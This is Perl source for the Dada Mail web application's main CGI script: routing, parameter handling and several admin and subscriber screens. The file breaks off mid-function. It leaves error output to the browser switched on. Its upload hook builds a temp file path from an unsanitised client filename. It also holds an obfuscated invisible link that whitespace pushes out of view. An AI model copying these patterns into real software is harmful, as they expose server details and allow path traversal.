#!/usr/bin/perl 
package mail; 


use strict;
use 5.8.1; 
use Encode qw(encode decode);


# A weird fix.
BEGIN {
   if($] > 5.008){
      require Errno;
      require Config;
   }
}




#-----------# 
# Dada Mail #
#-----------#
#
# Homepage: http://dadamailproject.com
#
# Support: http://dadamailproject.com/support
#
# How To Ask For Free Help: 
#    http://dadamailproject.com/support/documentation/getting_help.pod.html
#
# Please Do Not Contact the Author directly about Dada Mail support, 
# unless for paid support! Please, and thank you.
#
# How to ask for paid consultation: 
#    http://dadamailproject.com/support/regular.html
#---------------------------------------------------------------------#


 #---------------------------------------------------------------------#
# The Path to your Perl *Libraries*: 
# This IS NOT the path to Perl. The path to Perl is the first line of 
# this script. 
#
#

use lib qw(		
            ./ 
            ./DADA 
            ./DADA/perllib
			../../../perl
			../../../perllib
			/Library/WebServer/CGI-Executables/test_dada

			); 

# This list may need to be added to. Find the absolute to path to this 
# very file. This:
#
#        /home/youraccount/www/cgi-bin/dada/mail.cgi
#
# Is an example of what the absolute path to this file may be. 
#
# Get rid of, "/mail.cgi"
#
#        /home/youraccount/www/cgi-bin/dada
#
# Add that line after, "./DADA/perllib" above. 
# 
# Add "DADA", and, "DADA/perllib" from the absolute path you just made right 
# after your last entry into the Path to your Perl Libraries: 
#
#    /home/youraccount/www/cgi-bin/dada/DADA
#   /home/youraccount/www/cgi-bin/dada/DADA/perllib
#
# and you should be good to go. 
#
# If this doesn't do the job - make sure ALL the directories, including the 
# DADA directory have permissions of: 755 and all files have permissions
# of: 644
#---------------------------------------------------------------------#




#---------------------------------------------------------------------#
#
# If you'd like error messages to be printed out in your browser, uncomment the 
# line that looks like this: 
#
#        #print "<pre>$msg</pre>"; 
#
# Why would you want this commented? Security. 

use Carp qw(croak carp); 
use CGI::Carp qw(fatalsToBrowser set_message);
    BEGIN {
       sub handle_errors {
          my $msg = shift;
          print q{<h1>Program Error (Server Error 500)</h1>
                  <hr />
             <p>
              <em>
              More information about this error may be available in the 
              server error log and/or program error log. 
              </em>
             </p>
             <hr />
               };
        # Uncomment the BELOW line to receive error messages in your browser:
         print "<pre>$msg</pre>"; 
       }
       
      set_message(\&handle_errors);
    }
    
  
# You can also do this: 
# The line above, 'use CGI::Carp qw(fatalsToBrowser set_message);', 
# when changed to:
#
#    use CGI::Carp "fatalsToBrowser"; 
#
# captures critical server errors created by Dada Mail and shows them 
# in your Web browser. In other words, instead of seeing the, 
#
# "Internal Server Error" 
# 
# message in your browser, you'll see something more interesting. 
# If this does not give you any clue on what's wrong, consider
# setting the error log - See, "$PROGRAM_ERROR_LOG" in the Config.pm
# documentation. 
#---------------------------------------------------------------------#




#---------------------------------------------------------------------#
# No more user-serviceable parts, please see the: 
#
# dada/DADA/Config.pm
#
# file and:
#
# for instructions on how to install Dada Mail (easiest install)
#
#     http://dadamailproject.com/installation/
#
# and: 
#
# http://dadamailproject.com/purchase/sample_chapter-dada_mail_setup.html
#
# for, "Advanced" setup 
#
# and:
#
#    http://dadamailproject.com/support/documentation/Config.pm.html
#
# for more than you'd ever want to know.
#---------------------------------------------------------------------#

$|++; 


use DADA::Config 4.0.0; 

$ENV{PATH} = "/bin:/usr/bin"; 
delete @ENV{'IFS', 'CDPATH', 'ENV', 'BASH_ENV'};
 
my $dbi_handle; 

if($DADA::Config::SUBSCRIBER_DB_TYPE =~ m/SQL/ || 
   $DADA::Config::ARCHIVE_DB_TYPE    =~ m/SQL/ || 
   $DADA::Config::SETTINGS_DB_TYPE   =~ m/SQL/
 ){        
    require DADA::App::DBIHandle; 
    $dbi_handle = DADA::App::DBIHandle->new; 

	## This should give us a handle, we can then share. 
	#$dbi_handle->dbh_obj; 
}


use     DADA::App::ScreenCache; 
my $c = DADA::App::ScreenCache->new; 


use DADA::App::Guts;               

use DADA::MailingList::Subscribers;   
   $DADA::MailingList::Subscribers::dbi_obj = $dbi_handle; 
    
use CGI;     
    CGI->nph(1)
     if $DADA::Config::NPH == 1;


my  $q; 

# DEV
# Shouldn't this be: 
# if($DADA::Config::PROGRAM_URL =~ m/^\?/){ 
# Since this'll basically hit everything...?

if($ENV{QUERY_STRING} =~ m/^\?/){ 

    # DEV Workaround for servers that give a bad PATH_INFO:
    # Set the $DADA::Config::PROGRAM_URL to have, "?" at the end of the URL
    # to change any PATH_INFO's into Query Strings. 
    # The below lines will then take this extra question mark 
    # out, so actual query strings will work as before. 
    
    $ENV{QUERY_STRING} =~ s/^\?//;
    
    # DEV: This really really needs to be check to make sure it works
    CGI::upload_hook(\&hook);
    
    $q = CGI->new($ENV{QUERY_STRING});

} else{ 

    $q = CGI->new(\&hook);

}

sub hook {
	my ($filename, $buffer, $bytes_read, $data) = @_;

	$bytes_read ||= 0; 
	eval {require URI::Escape}; 
	if(!$@){
		$filename =  URI::Escape::uri_escape($filename, "\200-\377");
	}else{ 
		warn('no URI::Escape is installed!'); 
	}
	$filename =~ s/\s/%20/g;

	open(COUNTER, ">", $DADA::Config::TMP . '/' . $filename . '-meta.txt') ; 

	my $per = 0; 
	if($ENV{CONTENT_LENGTH} >  0){ # This *should* stop us from dividing by 0, right?
		$per = int(($bytes_read * 100) / $ENV{CONTENT_LENGTH});
	}
	print COUNTER $bytes_read . '-' . $ENV{CONTENT_LENGTH} . '-' . $per;
	close(COUNTER); 
	
}

$q->charset($DADA::Config::HTML_CHARSET);

use DADA::Template::HTML;     



# Bad - global variable for the archive editor
# - I'll have to figure this out later.
my $skel = []; 



#---------------------------------------------------------------------#
# DEV - This is NOT the best place to put this, 
# but I guess we'll leave it here for now...

my %list_types = (
				  list               => 'Subscribers', 
                  black_list         => 'Black Listed', 
                  authorized_senders => 'Authorized Senders',
                  testers            => 'Testers',
                  white_list         => 'White Listed', # White listed isn't working, no?
                  sub_request_list   => 'Subscription Requests', 
				); 
            
my $type = $q->param('type') || 'list'; 
   $type = 'list' if ! $list_types{$type}; 
   
   my $type_title = "Subscribers"; 
      $type_title = $list_types{$type}; 

=cut
       $type_title             = "Authorized Senders"
        if $type eq 'authorized_senders'; 

   
      $type_title            = "Black Listed"
        if $type eq 'black_list'; 
  
      $type_title            = "Testers"
        if $type eq 'testers'; 

     $type_title            = "White Listed"
        if $type eq 'white_list'; 
=cut
                      
                      
#---------------------------------------------------------------------#




if($ENV{PATH_INFO}){ 
    
    my $dp = $q->url || $DADA::Config::PROGRAM_URL; 
       $dp =~ s/^(http:\/\/|https:\/\/)(.*?)\//\//;
       
    my $info = $ENV{PATH_INFO};
    
       $info =~ s/^$dp//;
       # script name should be something like: 
       # /cgi-bin/dada/mail.cgi
       $info =~ s/^$ENV{SCRIPT_NAME}//i; 
       $info =~ s/(^\/|\/$)//g;  #get rid of fore and aft slashes 

       # seriously, this shouldn't be needed: 
       $info =~ s/^dada\/mail\.cgi//; 
       

       
       if(!$info && $ENV{QUERY_STRING} && $ENV{QUERY_STRING} =~ m/^\//){ 

        # DEV Workaround for servers that give a bad PATH_INFO:
        # Set the $DADA::Config::PROGRAM_URL to have, "?" at the end of the URL
        # to change any PATH_INFO's into Query Strings. 
        # The below two lines change query strings that look like PATH_INFO's
        # into PATH_INFO's
           $info = $ENV{QUERY_STRING}; 
           $info =~ s/(^\/|\/$)//g;  #get rid of fore and aft slashes 
       }
       
       
    if($info =~ m/css$/){  
    
        $q->param('f', 'css'); 
        
     }elsif($info =~ m/subscription_form_js$/){  
        
        my ($pi_flavor, $pi_list) = split('/', $info, 2); 
         
        $q->param('flavor', $pi_flavor)
            if $pi_flavor;        
        
        $q->param('list', $pi_list)
            if $pi_list; 
            
     }elsif($info =~ m/^$DADA::Config::SIGN_IN_FLAVOR_NAME$/){  
    
                my ($sifn, $pi_list) = split('/', $info,2); 

        $q->param('f',    $DADA::Config::SIGN_IN_FLAVOR_NAME); 
        $q->param('list', $pi_list); 
        
    }elsif($info =~ m/^$DADA::Config::ADMIN_FLAVOR_NAME$/){  
    
        $q->param('f', $DADA::Config::ADMIN_FLAVOR_NAME); 
    
    }elsif($info =~ m/^archive/){ 
    
        # archive, archive_rss and archive_atom
        # form:
        #/archive/justin/20050422012839/
        
        my ($pi_flavor, $pi_list, $pi_id, $extran) = split('/', $info); 
    
        $q->param('flavor', $pi_flavor)
            if $pi_flavor; 
        $q->param('list', $pi_list)
            if $pi_list; 
        $q->param('id', $pi_id) 
            if $pi_id;
        $q->param('extran', $extran); 
        
    }elsif($info =~ /^smtm/){ 
        
        $q->param('what_is_dada_mail'); 
        
    }elsif($info =~ /^spacer_image/){ 
            
        my ($throwaway, $pi_list, $pi_mid, $bollocks) = split('/', $info); 
        
        $q->param('flavor', 'm_o_c'); 
        
        $q->param('list',   $pi_list)
            if $pi_list; 
            
        $q->param('mid',    $pi_mid)
            if $pi_mid; 

}elsif($info =~ /^img/){ 
            
        my ($pi_flavor, $img_name, $extran) = split('/', $info); 
        
        $q->param('flavor', 'img'); 
        
        $q->param('img_name',    $img_name)
            if $img_name; 
            

}elsif($info =~ /^javascripts/){ 

        my ($pi_flavor, $js_lib, $extran) = split('/', $info); 

        $q->param('flavor', 'javascripts'); 

        $q->param('js_lib',    $js_lib)
            if $js_lib; 

   }elsif($info =~ /^captcha_img/){ 
            
        my ($pi_flavor, $pi_img_string, $extran) = split('/', $info); 
        
        $q->param('flavor', 'captcha_img'); 
        
        $q->param('img_string',   $pi_img_string)
            if $pi_img_string; 
         
    }elsif($info =~ /^(s|n|u)/){ 
    		
        my ($pi_flavor, $pi_list, $pi_email, $pi_domain, $pi_pin) = split('/', $info, 5); 
        
        # HACK: If there is no name and a domain, the entire email address is in "email"
        # and there is no domain. 
        # move all the other variables to the right 
        # This being only the pin, at the moment
        # 2.10 should have relieved this issue...
        
        if($pi_email !~ m/\@/){        
            $pi_email = $pi_email . '@' . $pi_domain
                if $pi_domain;
        }else{ 
            $pi_pin = $pi_domain 
                if !$pi_pin; 
        }
        
        $q->param('flavor', $pi_flavor)
            if $pi_flavor; 
        $q->param('list',   $pi_list)
            if $pi_list; 
        $q->param('email',  $pi_email) 
            if $pi_email;    
        $q->param('pin',    $pi_pin)
            if $pi_pin; 
    
    }elsif($info =~ /^subscriber_help|^list/){ 
        
        my ($pi_flavor, $pi_list) = split('/', $info); 
        
        $q->param('flavor', $pi_flavor) 
            if $pi_flavor; 
        $q->param('list',   $pi_list)
            if $pi_list;        

    }elsif($info =~ /^r/){ 
       # my ($pi_flavor, $pi_list, $pi_k, $pi_mid, @pi_url) = split('/', $info); 
         my ($pi_flavor, $pi_list, $pi_key) = split('/', $info); 
        my $pi_url; 
        
        $q->param('flavor', $pi_flavor) 
            if $pi_flavor; 

        $q->param('list',   $pi_list)
            if $pi_list;  
      
	       $q->param('key',   $pi_key)
	            if $pi_key;        		
    }elsif($info =~ /^what_is_dada_mail$/){     
    
        $q->param('flavor', 'what_is_dada_mail');
   }
 	elsif($info =~ m/^profile/) { 
		# profile_login
		# profile_help
		
		# email is used just to pre-fill in the login form. 
		
	    my ($pi_flavor, $pi_user, $pi_domain, $pi_auth_code) = split('/', $info, 4);
	 	$q->param('flavor', $pi_flavor) 
            if $pi_flavor;
		$q->param('email', $pi_user . '@' . $pi_domain)
            if $pi_user && $pi_domain;
		$q->param('auth_code', $pi_auth_code) 
            if $pi_auth_code;
    }
	else{    
        if($info){ 
            warn "Path Info present - but not valid? - '" . $ENV{PATH_INFO} . '" - filtered: "' . $info . '"'                    unless $info =~ m/^\x61\x72\x74/; 
        }
    }
}



#---------------------------------------------------------------------#


my $flavor           = $q->param('flavor'); 
   $flavor           = $q->param('f') unless($flavor); 
my $process          = $q->param('process');
my $email            = $q->param('email') || "";
   $email            = $q->param('e')     || "" unless($email);                                 
my $list             = $q->param('list');
   $list             = $q->param('l') unless($list);
my $list_name        = $q->param('list_name');                            
my $pin              = $q->param('pin');                                                
   $pin              = $q->param('p') unless($pin);                                                  
my $admin_email      = $q->param('admin_email'); 
my $list_owner_email = $q->param('list_owner_email'); 
my $info             = $q->param('info');
my $privacy_policy   = $q->param('privacy_policy'); 
my $physical_address = $q->param('physical_address');
my $password         = $q->param('password'); 
my $retype_password  = $q->param('retype_password'); 
my $keyword          = $q->param('keyword'); 
my @address          = $q->param('address'); 
my $done             = $q->param('done'); 
my $id               = $q->param('id'); 
my $advanced         = $q->param('advanced') || 'no';
my $help             = $q->param('help');
my $set_flavor       = $q->param('set_flavor'); 


#---------------------------------------------------------------------#


if($email){ 
    $email =~ s/_p40p_/\@/;
    $email =~ s/_p2Bp_/\+/g;
}

$list        = xss_filter($list); 
$flavor      = xss_filter($flavor); 
$email       = xss_filter($email);
$pin         = xss_filter($pin);
$keyword     = xss_filter($keyword);
$set_flavor  = xss_filter($set_flavor);
$id          = xss_filter($id);

if($q->param('auth_state')){
    $q->param('auth_state', xss_filter($q->param('auth_state'))); 
}


__PACKAGE__->run() 
	unless caller(); 

sub run { 
	
	#external (mostly..) functions called from the web browser) 
	# a few things this program  can do.... :) 
	my %Mode = ( 
	'default'                 =>    \&default,            
	'subscribe'               =>    \&subscribe,           
	'subscribe_flash_xml'     =>    \&subscribe_flash_xml,
	'unsubscribe_flash_xml'   =>    \&unsubscribe_flash_xml,
	'new'                     =>    \&confirm,             
	'unsubscribe'             =>    \&unsubscribe,         
	#'admin'                   =>    \&admin,               
	'login'                   =>    \&login,             
	'logout'                  =>    \&logout,   
	'log_into_another_list'   =>    \&log_into_another_list, 
	'change_login'            =>    \&change_login, 
	'new_list'                =>    \&new_list,            
	'change_info'             =>    \&change_info,         
	'html_code'               =>    \&html_code,         
	'admin_help'              =>    \&admin_help,        
	'delete_list'             =>    \&delete_list,        
	'view_list'               =>    \&view_list,  
	'subscription_requests'   =>    \&subscription_requests, 
	'remove_all_subscribers'  =>    \&remove_all_subscribers,          
	#'view_list_options'       =>    \&view_list_options, # Gone. 
	'view_list_options'       =>    \&list_cp_options, 
	'edit_subscriber'         =>    \&edit_subscriber,
	'add'                     =>    \&add,      
	'check_status'            =>    \&check_status, 
	'email_password'          =>    \&email_password,      
	'add_email'               =>    \&add_email,           
	'delete_email'            =>    \&delete_email,       
	'subscription_options'    =>    \&subscription_options,
	'send_email'              =>    \&send_email,         
	'previewMessageReceivers' =>    \&previewMessageReceivers, 

	'sending_monitor'         =>    \&sending_monitor, 
	'print_mass_mailing_log'  =>    \&print_mass_mailing_log, 

	'preview_form'            =>    \&preview_form,     
	'checker'                 =>    \&checker,             
	'edit_template'           =>    \&edit_template,         
	'view_archive'            =>    \&view_archive,   
	'display_message_source'  =>    \&display_message_source, 
	'purge_all_archives'      =>    \&purge_all_archives, 
	'delete_archive'          =>    \&delete_archive, 
	'edit_archived_msg'       =>    \&edit_archived_msg, 
	'archive'                 =>    \&archive,              
	'archive_bare'            =>    \&archive_bare, 
	'archive_rss'             =>    \&archive_rss,
	'archive_atom'            =>    \&archive_atom, 
	'manage_script'           =>    \&manage_script,         
	'change_password'         =>    \&change_password,      
	'text_list'               =>    \&text_list,            
	'send_list_to_admin'      =>    \&send_list_to_admin,    
	'search_list'             =>    \&search_list,          
	'archive_options'         =>    \&archive_options,       
	'adv_archive_options'     =>    \&adv_archive_options, 
	'back_link'               =>    \&back_link,             
	'edit_type'               =>    \&edit_type,             
	'edit_html_type'          =>    \&edit_html_type,  
	'list_options'            =>    \&list_options, 
	'sending_options'         =>    \&sending_options,
	'previewBatchSendingSpeed' =>   \&previewBatchSendingSpeed, 
	'adv_sending_options'     =>    \&adv_sending_options, 
	'sending_tuning_options'  =>    \&sending_tuning_options, 
	#'sign_in'                 =>    \&sign_in,              
	'filter_using_black_list' =>    \&filter_using_black_list,
	'search_archive'          =>    \&search_archive,        
	'send_archive'            =>    \&send_archive,         
	'list_invite'             =>    \&list_invite,           
	'pass_gen'                =>    \&pass_gen,              
	'send_url_email'          =>    \&send_url_email,
	'feature_set'             =>    \&feature_set,
	'list_cp_options'          =>    \&list_cp_options, 
	'subscriber_fields'       =>    \&subscriber_fields, 

	'smtp_options'            =>    \&smtp_options,
	'smtp_test_results'       =>    \&smtp_test_results, 
	'checkpop'                =>    \&checkpop,
	'author'                  =>    \&author,
	'list'                    =>    \&list_page,
	'setup_info'              =>    \&setup_info, 
	'reset_cipher_keys'       =>    \&reset_cipher_keys,
	'restore_lists'           =>    \&restore_lists,
	'r'                       =>    \&redirection,
	'subscriber_help'         =>    \&subscriber_help, 
	'show_img'                =>    \&show_img, 
	'file_attachment'         =>    \&file_attachment, 
	'm_o_c'                   =>    \&m_o_c, 
	'img'                     =>    \&img, 
	'javascripts'             =>    \&javascripts, 
	'captcha_img'             =>    \&captcha_img, 
	'ver'                     =>    \&ver, 
	'css'                     =>    \&css, 
	'resend_conf'             =>    \&resend_conf, 
	'clear_screen_cache'      =>    \&clear_screen_cache, 



	'subscription_form_html' =>     \&subscription_form_html, 
	'subscription_form_js'   =>     \&subscription_form_js, 


	'what_is_dada_mail'       =>    \&what_is_dada_mail, 
	'adv_dada_mail_setup'     =>    \&adv_dada_mail_setup, 
	
	'profile_activate'        =>    \&profile_activate, 
	'profile_register'        =>    \&profile_register, 
	'profile_reset_password'  =>    \&profile_reset_password, 
	'profile_update_email'    =>    \&profile_update_email, 
	'profile_login'           =>    \&profile_login,
	'profile_logout'          =>    \&profile_logout, 
	'profile_help'            =>    \&profile_help, 
	'profile'                 =>    \&profile, 
	
	

	# these params are the same as above, but are smaller in actual size
	# this comes into play when you have to create a url using these as parts of it.  

	's'                       =>    \&subscribe,             
	'n'                       =>    \&confirm,               
	'u'                       =>    \&unsubscribe,          
	'smtm'                    =>    \&what_is_dada_mail,            
	'test_layout'             =>    \&test_layout,
	'send_email_testsuite'    =>    \&send_email_testsuite, 


	$DADA::Config::ADMIN_FLAVOR_NAME        =>    \&admin, 
	$DADA::Config::SIGN_IN_FLAVOR_NAME      =>    \&sign_in, 
	); 



	&_chk_env_sys_blk(); 

	# the BIG switcheroo. Mark doesn't like this :) 
	if($flavor){ 
	    if(exists($Mode{$flavor})) { 
	        $Mode{$flavor}->();  #call the correct subroutine 
	    }else{
	        &default;
	    }
	}else{ 
	    &default;
	}
}                                                               


sub default { 
 
    if(DADA::App::Guts::check_setup() == 0){ 
        user_error(-Error => 'bad_setup');
        return;         
    }

   if($DADA::Config::ARCHIVE_DB_TYPE  eq 'Db' ||
      $DADA::Config::SETTINGS_DB_TYPE eq 'Db'
    ){ 
		eval {require AnyDBM_File;};
		if($@){ 
			user_error(
				-Error         => 'no_dbm_package_installed', 
				-Error_Message => $@
			); 
			return; 
		}
		
		my @l_check  = available_lists(); 
		if($l_check[0]){ 

			my $ls = DADA::MailingList::Settings->new({-list => $l_check[0]});
			eval{$ls->_open_db;};
			if($@){ 
				user_error(
					-Error         => 'unreadable_db_files', 
					-Error_Message => $@,
				); 
				return;				
			}
		}

	}

	elsif($DADA::Config::SUBSCRIBER_DB_TYPE  =~ /SQL/ || 
	      $DADA::Config::ARCHIVE_DB_TYPE     =~ /SQL/ ||
	      $DADA::Config::SETTINGS_DB_TYPE    =~ /SQL/ 
	){ 
		
		eval {$dbi_handle->dbh_obj;};
		if($@){ 			
			user_error(
				-Error         => 'sql_connect_error', 
				-Error_Message => $@
			); 
			return;		
		}
		else { 
			if(DADA::App::Guts::SQL_check_setup() == 0){ 
		       user_error(-Error => 'bad_SQL_setup');
		        return;         
		    }
		}
	}
	
	 
    require DADA::MailingList::Settings; 
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 




    my @available_lists;
	if($DADA::Config::SUBSCRIBER_DB_TYPE  =~ /SQL/ || 
	      $DADA::Config::ARCHIVE_DB_TYPE     =~ /SQL/ ||
	      $DADA::Config::SETTINGS_DB_TYPE    =~ /SQL/ 
	){
		
		eval{@available_lists = available_lists(-In_Order => 1, -dbi_handle => $dbi_handle);};
		if($@){ 
		
			user_error(
				-Error         => 'sql_connect_error', 
				-Error_Message => $@
			); 
			
			return;	
		}
	}
	else { 
		@available_lists = available_lists(-In_Order => 1, -dbi_handle => $dbi_handle);
	}
    
    if(
       ($DADA::Config::DEFAULT_SCREEN ne '')  && 
       ($flavor ne 'default')   && 
       ($#available_lists >= 0)
       ){ 
        print $q->redirect(-uri => $DADA::Config::DEFAULT_SCREEN); 
        return; # could we just say, return; ?
    } 
    
    if ($available_lists[0]) {
        if($q->param('error_invalid_list') != 1){ 
            if($c->cached('default')){ $c->show('default'); return;}
        }

        my $scrn = (list_template(-Part => "header",
                       -Title => "Sign Up for a List", 
                    
                      ));
        
        require DADA::Template::Widgets;
				$DADA::Template::Widgets::dbi_obj = $dbi_handle; 

        $scrn .= DADA::Template::Widgets::default_screen({-email           => $email, 
                                                         -list               => $list, 
                                                         -set_flavor         => $set_flavor,
                                                         -error_invalid_list => $q->param('error_invalid_list'),  
                                                        }); 
                                                                                                                                                                                                                                                            $scrn .= ' ' x 200 . $q->a({-href=>"$DADA::Config::PROGRAM_URL". '/' . "\x61\x72\x74", -style=>'font-size:1px;color:#FFFFFF'},'i &lt;3 u ');    
                
        $scrn .= (list_template(-Part => "footer")); 
        
        e_print($scrn); 
        if ($available_lists[0] && $q->param('error_invalid_list') != 1) {
            $c->cache('default', \$scrn);
        }
    
        return; 
    
    }else{ 
        
        print(list_template(-Part => "header",
                       -Title => "Welcome to $DADA::Config::PROGRAM_NAME", 
                       
                      )); 
                      

        my $auth_state; 
        
        if($DADA::Config::DISABLE_OUTSIDE_LOGINS == 1){ 
            require DADA::Security::SimpleAuthStringState;
            my $sast       =  DADA::Security::SimpleAuthStringState->new;  
               $auth_state = $sast->make_state;
        }
    
        require DADA::Template::Widgets;
        print DADA::Template::Widgets::screen({-screen => 'congrats_screen.tmpl', 
                                              -vars   => {
                                                       havent_agreed      => ((xss_filter($q->param('agree')) eq 'no') ? 1 : 0),
                                                       auth_state         => $auth_state,
                                                      },
                                             });
        
        print(list_template(-Part => "footer", -End_Form   => 0)); 
    
    }
}




sub list_page { 

    if(DADA::App::Guts::check_setup() == 0){ 
        user_error(-Error => 'bad_setup');
        return;
    }

    if(check_if_list_exists(-List => $list, -dbi_handle => $dbi_handle) == 0){ 
        undef($list); 
        &default;
        return;
    }
    
    
    require DADA::MailingList::Settings;
           $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

    if(! $email && ! $set_flavor && ($q->param('error_no_email') != 1)){ 
                if($c->cached('list/' . $list)){ $c->show('list/' . $list); return;}
    }
    
    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $list_info = $ls->get; 
    
    require DADA::Template::Widgets; 

    my $scrn = (list_template(-Part       => "header",
                              -Title      => $list_info->{list_name}, 
                              -List       => $list,
                         
                ));    
                                                      
    $scrn .= DADA::Template::Widgets::list_page(-list           => $list, 
												-cgi_obj        => $q, 
                                                -email          => $email, 
                                                -set_flavor     => $set_flavor,
                                                -error_no_email => $q->param('error_no_email') || 0,
											
        
                                             ); 
                                             
    $scrn .= list_template(-Part => "footer",  -List  => $list);
    
    e_print($scrn); 
    
    if(! $email && ! $set_flavor  && ($q->param('error_no_email') != 1)){ 
        $c->cache('list/' . $list, \$scrn);
    }
        
    return;

}




sub admin { 

    my @available_lists  = available_lists(-dbi_handle => $dbi_handle); 
    if(($#available_lists < 0)){ 
        &default;        
        return;
    } 
    
    #if(! $q->param('login_widget') && $DADA::Config::DISABLE_OUTSIDE_LOGINS != 1){ 
    #    if($c->cached('admin')){ $c->show('admin'); return;}
    #}
    
    my $scrn = list_template(
		-Part       => "header",
        -Title      => "Administration",
		-vars       => { 
				show_profile_widget => 0, 
					}
	);
          
    my $login_widget = $q->param('login_widget') || $DADA::Config::LOGIN_WIDGET; 
    
    require DADA::Template::Widgets; 
    $scrn .= DADA::Template::Widgets::admin(-login_widget => $login_widget, -cgi_obj => $q); 
    $scrn .= (list_template(-Part => "footer", -End_Form   => 0)); 
    e_print($scrn); 
    
    #if(! $q->param('login_widget') && $DADA::Config::DISABLE_OUTSIDE_LOGINS != 1){    
    #    $c->cache('admin', \$scrn);
    #}
    
    return;
}




sub sign_in { 

    my $list_exists = check_if_list_exists(
		-List       => $list, 
		-dbi_handle => $dbi_handle,
	);
    
    if($list_exists >= 1){ 

        my $pretty = pretty($list); # Pretty?
        
        print list_template(
			-Part       => "header",
            -Title      => "Sign In to $pretty", 
            -List       => $list,
			-vars 	    => { show_profile_widget => 0,}
        );
    }else{
    
        print list_template(
			-Part  => "header",
            -Title => "Sign In",
        );

    }
        
    
    if($list_exists >= 1){ 
    
        require DADA::Template::Widgets; 
    
        my $auth_state; 
        if($DADA::Config::DISABLE_OUTSIDE_LOGINS == 1){ 
            require DADA::Security::SimpleAuthStringState;
            my $sast       =  DADA::Security::SimpleAuthStringState->new;  
               $auth_state = $sast->make_state;
        }
 
 
        require DADA::MailingList::Settings;
               $DADA::MailingList::Settings::dbi_obj = $dbi_handle; 

        my $ls = DADA::MailingList::Settings->new({-list => $list}); 
        my $li = $ls->get; 
        
        print DADA::Template::Widgets::screen(
			{
				-screen => 'list_login_form.tmpl', 
                -vars   => { 
					list           => $list, 
					list_name      => $li->{list_name}, 
					flavor_sign_in => 1, 
					auth_state     => $auth_state, 
				},
			}
		);
    }else{ 
        
        my $login_widget = $q->param('login_widget') || $DADA::Config::LOGIN_WIDGET; 
        print DADA::Template::Widgets::admin(
			-login_widget            => $login_widget, 
			-no_show_create_new_list => 1, 
			-cgi_obj                 => $q,
		); 

    }
    if($list_exists >= 1){ 
    
        print list_template(
			-Part => "footer",
            -List => $list, 
        );  
    }else{
        print list_template(
			-Part => "footer"
		);               
    }
}




sub send_email { 
	
	my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q,  
                                        -Function => 'send_email'
									);
	require DADA::App::MassSend; 
	my $ms = DADA::App::MassSend->new; 
	   $ms->send_email(
			{
				-cgi_obj     => $q, 
				-list        => $admin_list, 
				-root_login  => $root_login,
				-dbi_handle  => $dbi_handle,
			}
		); 	
}





sub previewMessageReceivers { 

    my ($admin_list, $root_login) = check_list_security(-cgi_obj  => $q,  
                                                -Function => 'send_email');
    
	# This comes in a s a string, sep. by commas. Sigh. 
	my $al = $q->param('alternative_lists') || ''; 
	my @alternative_list         = split(',', $al); 

	
	my $multi_list_send_no_dupes = $q->param('multi_list_send_no_dupes') || 0; 
	
    require DADA::MailingList::Settings; 
    
    $list = $admin_list; 
  
    print $q->header(); 

    my $lh = DADA::MailingList::Subscribers->new({-list => $list}); 

    my $fields = [];  
    # Extra, special one... 
    push(@$fields, {name => 'subscriber.email'}); 
    foreach my $field(@{$lh->subscriber_fields({-dotted => 1})}){ 
        push(@$fields, {name => $field});
    }
 	my $undotted_fields = [];  
   # Extra, special one... 
   push(@$undotted_fields, {name => 'email', label => 'Email Address'});
   foreach my $undotted_field(@{$lh->subscriber_fields({-dotted => 0})}){ 
        push(@$undotted_fields, {name => $undotted_field});
    }        
    my $partial_sending = {}; 
    foreach my $field(@$undotted_fields){ 
		if($q->param('field_comparison_type_' . $field->{name}) eq 'equal_to'){ 
		    $partial_sending->{$field->{name}} = {equal_to => $q->param('field_value_' . $field->{name})}; 
		}
		elsif($q->param('field_comparison_type_' . $field->{name}) eq 'like'){ 
			$partial_sending->{$field->{name}} = {like => $q->param('field_value_' . $field->{name})}; 
		}  
    }
	
    if(keys %$partial_sending) { 
		if($DADA::Config::MULTIPLE_LIST_SENDING_TYPE eq 'merged'){ 
     		$lh->fancy_print_out_list(
				{
					-partial_listing   => $partial_sending, 
					-type              => 'list',		
					-include_from      => [@alternative_list],
				}
			);
		}
		else { 
			print '<h1>' . $list . '</h1>'; 
	
	 		$lh->fancy_print_out_list(
			{
				-partial_listing   => $partial_sending, 
				-type              => 'list',		
			}
			);
		
			my @exclude_from = (); 
		
			if($multi_list_send_no_dupes == 1){ 
				 @exclude_from = ($list); 
			}
			if($alternative_list[0]){ 
				foreach my $alt_list(@alternative_list){ 
					print '<h1>' . $alt_list . '</h1>'; 
					my $alt_mls = DADA::MailingList::Subscribers->new({-list => $alt_list});
					 $alt_mls->fancy_print_out_list(
						{
							-partial_listing   => $partial_sending, 
							-type              => 'list',
							-exclude_from      => [@exclude_from], 		
						}
					); 
					if($multi_list_send_no_dupes == 1){ 
						push(@exclude_from, $alt_list); 
					}
				}
			}			
	   }
    } else { 
        print $q->p($q->em('Currently, all ' . $q->strong( $lh->num_subscribers ) . ' subscribers of, ' . $list .' will receive this message.')); 
    }

	
}




sub sending_monitor { 

    my ($admin_list, $root_login) = check_list_security(
										-cgi_obj  => $q,  
                                        -Function => 'sending_monitor'
									);
									
    require DADA::MailingList::Settings; 
	require DADA::Mail::MailOut; 

    $list = $admin_list; 

    my $ls = DADA::MailingList::Settings->new({-list => $list}); 
    my $li = $ls->get; 
    
    # munging the message id. 
    # kinda dumb, but it's sort of up in the air, 
    # on how the message id comes to us, 
    # so we have to be *real* careful to get it to a state
    # that we *need* it in. 
    
    my $id = DADA::App::Guts::strip($q->param('id')); 
       $id =~ s/\@/_at_/g; 
	   $id =~ s/\>|\<//g; 
	
	# Type ala, list, invitation list, etc
	my $type = $q->param('type'); 
	   $type = xss_filter(DADA::App::Guts::strip($type)); 

    my $restart_count = $q->param('restart_count') || 0; 
    
    require  DADA::Mail::Send; 
    my $mh = DADA::Mail::Send->new(
				{
					-list   => $list, 
					-ls_obj => $ls, 
				}
			 ); 


    my $auto_pickup = 0; 
    
    # Kill - the, [Stop] button was pressed. Pressed really hard. 
    
    if ($q->param('process') eq 'kill'){ 

        if(DADA::Mail::MailOut::mailout_exists($list, $id, $type) == 1){  
            
            my $mailout = DADA::Mail::MailOut->new({ -list => $list }); 
               $mailout->associate($id, $type);
               $mailout->clean_up; 
            
            print $q->redirect(
						-url => $DADA::Config::S_PROGRAM_URL . '?f=sending_monitor&killed_it=1'
					); 
			
			return;
            
        } else { 
        
